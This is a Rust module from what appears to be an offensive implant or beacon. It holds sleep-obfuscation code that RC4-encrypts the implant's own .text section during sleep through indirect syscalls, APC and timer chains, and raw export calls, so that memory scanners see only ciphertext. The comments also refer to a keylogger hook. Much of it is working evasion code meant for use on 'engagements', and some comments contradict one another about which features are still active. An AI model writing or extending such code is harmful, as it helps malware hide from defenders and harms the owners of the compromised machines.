//! Sleep obfuscation — Foliage syscall executor (P2.1a-iii).
//!
//! ## Status: Full Foliage APC→NtContinue chain, GATED ON (default).
//! The pure state-machine math lives in `nyx_implant_evasionsdk::foliage` (5
//! host tests). This module maps the chain to indirect syscalls:
//!   - protect the .text RX→RW (NtProtectVirtualMemory)
//!   - RC4-encrypt the region in place (SystemFunction032 math, via evasionsdk)
//!   - save the beacon thread's original CONTEXT (NtGetContextThread — step 4)
//!   - queue APCs (NtQueueApcThread) that each NtContinue into the next CONTEXT
//!   - the sleep itself (NtDelayExecution in the APC window)
//!   - decrypt + protect RW→RX on wake
//!   - restore the beacon thread's original CONTEXT (NtSetContextThread — step 8)
//!
//! ## Threading model (GetContext / RestoreContext)
//! GetContext and RestoreContext run on the **beacon thread** (not the helper):
//!   - GetContext: called BEFORE spawning the helper, while the beacon thread
//!     is still running its normal flow. This snapshots the original register
//!     state (including RSP) into a heap-allocated CONTEXT buffer.
//!   - RestoreContext: called AFTER joining the helper, once .text is decrypted
//!     and unprotected. Restores the beacon thread to its pre-sleep register
//!     state via NtSetContextThread.
//! The helper thread reads the saved RSP from the shared FoliageParams to build
//! the spoofed CONTEXT — it does NOT call NtGetContextThread itself.
//!
//! ## Gating
//! `FOLIAGE_ENABLED` defaults ON — the full APC chain + .text RC4 masking is
//! active on every sleep cycle. The operator can disarm at runtime via
//! `set_foliage_enabled(false)` if the target requires minimal footprint.

#![cfg(target_os = "windows")]

use alloc::boxed::Box;
use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, Ordering};
use nyx_implant_evasionsdk::foliage::{FoliagePlan, FoliageStep};

/// Master switch for the Foliage sleep mask. **Defaults ON** — the full APC
/// chain + .text RC4 masking is active on every sleep cycle. The operator can
/// disarm at runtime via `set_foliage_enabled(false)` if the target requires
/// minimal footprint. See module docs for the 7-stage APC plan.
///
/// Build-time override: set `NYX_FOLIAGE_OFF=1` to ship the implant with
/// Foliage disarmed by default (the runtime `set_foliage_enabled` still works).
/// This is for hosts where the APC-chain sleep mask is unstable in the loader
/// context (e.g. `rundll32`-loaded PIC DLLs whose `.text`/thread context
/// Foliage's NtSetContextThread restore mishandles, surfacing as
/// STATUS_STACK_BUFFER_OVERRUN). sRDI-injected into a real host process the
/// mask is expected to work — leave the default ON for engagements.

/// P4 — Foliage APC path master switch. OFF by default: the PIC thunk
/// (`pic_thunk::build_mask_thunk`) emits research-grade shellcode that needs
/// real-machine validation before it can run unsupervised. The operator opts
/// in with `NYX_FOLIAGE_APC_ON=1` at build time, after verifying the thunk on
/// the target. When OFF, `execute_foliage_plan` uses the data-only floor
/// (heap mask + indirect-syscall sleep — still meaningful, just without
/// `.text` encryption).
///
/// When ON, `execute_foliage_plan` builds the PIC thunk, copies it to an
/// executable stack page, and queues it via `NtQueueApcThread` against the
/// beacon's alertable window — encrypting `.text` for the sleep window so
/// Hunt-Sleeping-Beacons / BeaconEye see ciphertext. The thunk un-encrypts
/// `.text` before the beacon resumes.
///
/// Mutually exclusive with the keylog hook thread: encrypting `.text` while
/// `keylog::hook_is_active()` would corrupt the hook callback (which lives in
/// `.text`). When both are on, the APC path degrades to the data-only floor
/// for that cycle (see `execute_foliage_plan`).

/// Sleep `seconds` with sleep-mask obfuscation.
///
/// **With [`foliage_enabled`] ON (default)**: builds a `FoliagePlan` and
/// executes the Foliage mask→sleep→unmask cycle over the implant `.text`
/// via indirect syscalls. The full APC chain + RC4 masking is active.
///
/// **With [`foliage_enabled`] OFF**: delegates to `beacon::sleep_seconds`
/// (plain indirect-syscall NtDelayExecution). On any failure (runtime down,
/// .text unresolved), degrades to the plain sleep — never crashes.
///
/// # Deprecated: superseded by `crate::fluctuation::sleep`
///
/// This entry point has zero callers — the beacon loop routes through
/// `kits::sleep` → `fluctuation::sleep` (see `kits.rs:55`). Kept for
/// reference; do NOT add new callers. The module's helpers (`own_text_region`,
/// `section_va_len`, `raw_create_thread`, `FoliageRaw`) ARE still live and
/// used by `fluctuation`, `evasion_glue`, `keylog`, `insomniac`, `selftests`.
#[allow(dead_code)]
pub fn sleep(seconds: u32) {
    // Delegate to fluctuation sleep mask (military-grade, CFG/CET immune).
    // Falls back to plain NtDelayExecution if fluctuation is disabled or fails.
    crate::fluctuation::sleep(seconds);
}

/// The implant's own `.text` region (base + len). Used by the Foliage APC chain
/// and the `MemoryMaskKit` live impl. Reading PEB->ImageBaseAddress is correct
/// for both rundll32 and reflective-loaded implants.
pub(crate) struct TextRegion {
    pub base: usize,
    pub len: usize,
}

/// The implant's own `.text` region (base + len). Walks the PEB LDR list to
/// find the module that contains `own_text_region`'s own address — this works
/// correctly for DLL-loaded implants (rundll32.exe), unlike the PEB->ImageBaseAddress
/// approach which returns the host EXE's base.
///
/// Returns None only if the PEB/PE headers are unreadable (shouldn't happen).
///
/// # Safety
/// PEB + PE header reads are stable post-load. Single-threaded context.
pub(crate) unsafe fn own_text_region() -> Option<TextRegion> {
    let our_addr = own_text_region as *const () as usize;
    let peb = crate::resolve::peb_pointer()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    let mut guard = 0u32;
    while head as *const u8 != list_start && guard < 256 {
        guard += 1;
        let entry: *mut crate::resolve::ListEntry = head as *mut crate::resolve::ListEntry;
        let base = (*entry).dll_base as usize;
        let size = (*entry).size_of_image as usize;
        if base != 0 && our_addr >= base && our_addr < base + size {
            let (text_rva, text_size) = section_va_len(base, b".text")?;
            return Some(TextRegion {
                base: base + text_rva,
                len: text_size,
            });
        }
        head = (*entry).in_load_order_links.flink;
    }
    None
}

/// Find a PE section's (virtual_address, virtual_size) by name. Returns None
/// if the PE headers can't be parsed or the section isn't found.
#[allow(dead_code)] // used by the APC-chain refactor (own_text_region)
pub(crate) unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
    let dos = unsafe { &*(base as *const [u8; 64]) };
    if dos[0] != b'M' || dos[1] != b'Z' {
        return None;
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    let nt = unsafe { &*((base + e_lfanew) as *const [u8; 24]) };
    if !(nt[0] == b'P' && nt[1] == b'E') {
        return None; // bad PE signature
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = e_lfanew + 24 + size_opt_hdr;
    for i in 0..num_sections {
        // IMAGE_SECTION_HEADER: Name[8] + VirtualSize(4) + VirtualAddress(4) + ...
        let sec = unsafe { &*((base + sections_off + i * 40) as *const [u8; 40]) };
        let name_len = name.iter().position(|&b| b == 0).unwrap_or(name.len());
        if sec[..name_len] == name[..name_len] {
            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
            return Some((vaddr, vsize));
        }
    }
    None
}

/// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
/// Per-boot diversity from the syscall runtime's SSN table.

/// Walk the FoliagePlan: mask `.text`, park the beacon in an APC-driven alertable
/// sleep, unmask `.text` on wake. Falls back to the data-only mask floor on any
/// failure (never crashes — see [`execute_foliage_apc`]).
///
/// ## How the .text encryption is now safe (Task E)
/// The previous floor masked only registered DATA regions (via `crate::mem`)
/// because encrypting `.text` while executing through it is instant death (the
/// RC4 loop overwrites its own instructions). Task E adds the real Foliage
/// mechanism: a SEPARATE helper thread masks/unmasks `.text` around the beacon
/// thread's parked alertable sleep, and queues an APC into the beacon's
/// alertable window so the beacon is driven through the masked window without
/// executing `.text` while it's ciphertext. See [`execute_foliage_apc`].

// ===========================================================================
// Task E: real Foliage APC chain — helper thread masks .text around the
// beacon's alertable sleep. Returns true if the full cycle completed.
// ===========================================================================
//
// ## Threading model & the single-trampoline hazard
// The indirect-syscall `Runtime` (syscalls.rs) owns ONE shared RWX trampoline
// page with NO locking — it assumes a single beacon thread. A helper thread
// that also goes through `syscallN` would race on that page and corrupt it.
// So the helper thread resolves + calls the NT/Win32 functions it needs via
// the RAW ntdll/kernel32 EXPORT addresses (`crate::resolve::export_addr` +
// transmute), bypassing the indirect runtime entirely. The beacon thread
// keeps exclusive use of the indirect runtime. Two threads, two syscall paths,
// no shared mutable page.
//
// ## Safety / crash risk (red-line honesty)
// This manipulates another thread's execution window and flips `.text`
// protection. A bug here crashes the implant (user-mode, NOT a BSOD). Every
// step degrades on failure (returns false → caller falls to the data-only
// floor), and the round-trip is byte-verified before reporting success.
// `FOLIAGE_APC_OK` is the diagnostic a selftest reads.

/// Diagnostic: 0 = not attempted, 1 = APC chain completed cleanly, 2 = attempted
/// but degraded (data-only floor ran). Selftest reads this.

/// Run one real Foliage cycle: spawn a helper thread, beacon parks in an
/// alertable sleep, helper masks `.text` → queues an APC → waits → unmasks.
/// Returns true on full success; on ANY failure sets status=2 and returns
/// false so the caller degrades to the data-only floor.
///
/// ## FoliagePlan traversal (steps 4 + 8)
/// This function implements GetContext (step 4) and RestoreContext (step 8) on
/// the **beacon thread** — NOT the helper:
///   - **GetContext**: After resolving `FoliageRaw`, before spawning the helper,
///     call `NtGetContextThread(beacon_handle, &saved_ctx)` to capture the
///     beacon's original register state (including RSP). The saved CONTEXT is
///     stored in `FoliageParams` so the helper can read `saved_ctx.rsp()` when
///     building the spoofed CONTEXT for NtContinue.
///   - **RestoreContext**: After joining the helper (`.text` is decrypted and
///     unprotected), call `NtSetContextThread(beacon_handle, &saved_ctx)` to
///     restore the beacon thread to its pre-sleep register state.
///
/// # Safety
/// `region` must be the implant's own `.text`. Single beacon caller.
///
/// ## Implementation: Ekko timer-queue ROP chain (Cracked5pider)
///
/// This uses `CreateTimerQueueTimer` to queue a chain of `NtContinue` calls,
/// each carrying a pre-built `CONTEXT` whose RIP points at a different Win32
/// API. The chain runs entirely on a **timer thread** (not .text), so when
/// `SystemFunction032` encrypts `.text`, the timer thread's code (in ntdll/
/// kernel32) is unaffected.
///
/// Chain (100ms intervals):
///   1. VirtualProtect(.text, RW)      — make .text writable
///   2. SystemFunction032(RC4 encrypt) — encrypt .text
///   3. WaitForSingleObject(sleep)     — sleep the window
///   4. SystemFunction032(RC4 decrypt) — decrypt .text
///   5. VirtualProtect(.text, RX)      — restore execute protection
///   6. SetEvent(done)                 — signal completion
///
/// Source: https://github.com/Cracked5pider/Ekko (verified C implementation).

/// Mark `addr` as a valid CFG call target using `SetProcessValidCallTargets`
/// (kernelbase.dll, official Win10+ API). Falls back to the NT path
/// (NtSetInformationVirtualMemory) if kernelbase isn't resolvable.
///
/// CRITICAL: CFG_CALL_TARGET_INFO.Offset MUST be 16-byte aligned.
/// Returns true on success or if CFG is not enabled (non-fatal).

/// RC4 shim with the calling convention the PIC thunk expects:
///   `extern "system" fn(key: *const u8, key_len: usize, buf: *mut u8, len: usize)`
/// Calls the evasionsdk's mask_region (RC4 is symmetric — mask = unmask).
/// This fn itself lives in .text, but it's called by the thunk DURING the
/// brief window between protect(RW) and the mask — at that point .text is
/// still cleartext (the RC4 hasn't happened yet). The danger window is only
/// during the NtWait (when .text is ciphertext), and during that window the
/// thunk executes from the allocated page (not .text), not this shim.

/// Pack two usize values (thunk_code_addr + params_addr) into the single
/// `usize` parameter that `raw_create_thread` accepts.

/// Bundle of raw export fn-pointers the helper thread uses (resolved once on
/// the beacon thread, copied into the helper's param block). NONE of these go
/// through the indirect syscall runtime — they call the export directly.
///
/// Only `nt_protect` remains after the Foliage APC chain was removed (commit
/// 841ffc5); it is still used by `mem::mask_text_and_heap` /
/// `mem::unmask_text_and_heap` (dormant, pending Fluctuation wiring).
#[derive(Clone, Copy)]
pub struct FoliageRaw {
    nt_protect: usize,
}

impl FoliageRaw {
    /// Raw NtProtectVirtualMemory(ProcessHandle=-1, BaseAddress*, RegionSize*,
    /// NewProtection, OldProtection*). Returns the NTSTATUS.
    ///
    /// # Safety
    /// `base`/`size`/`old` must be valid mutable pointers.
    pub(crate) unsafe fn nt_protect_virtual_memory(
        &self,
        base: &mut usize,
        size: &mut usize,
        new_prot: u32,
        old: &mut u32,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(usize, *mut usize, *mut usize, u32, *mut u32) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_protect) };
        unsafe { f(0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old) }
    }
}

/// Raw kernel32!CreateThread → spawn `entry(param)`. Returns the thread handle
/// or None on failure.
///
/// # Safety
/// `entry` must be a valid thread-proc-style fn (usize arg → u32). Runs the
/// entry on a new thread.
/// Spawn a raw Win32 thread (kernel32!CreateThread) that runs entirely on raw
/// exports — bypassing the shared indirect-syscall trampoline (`syscalls::global()`).
///
/// `pub(crate)` so the keylog hook thread (P2) can reuse this without
/// duplicating the CreateThread resolution. Returns the thread handle (owned
/// by the caller; Close via `NtClose`).
pub(crate) unsafe fn raw_create_thread(
    entry: unsafe extern "system" fn(usize) -> u32,
    param: usize,
) -> Option<usize> {
    let addr = crate::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
    type Fn = unsafe extern "system" fn(
        *mut core::ffi::c_void,                          // lpThreadAttributes
        usize,                                           // dwStackSize
        Option<unsafe extern "system" fn(usize) -> u32>, // lpStartAddress
        usize,                                           // lpParameter
        u32,                                             // dwCreationFlags
        *mut u32,                                        // lpThreadId
    ) -> *mut core::ffi::c_void;
    let f: Fn = unsafe { core::mem::transmute(addr) };
    let h = unsafe {
        f(
            core::ptr::null_mut(),
            0,
            Some(entry),
            param,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        None
    } else {
        Some(h as usize)
    }
}
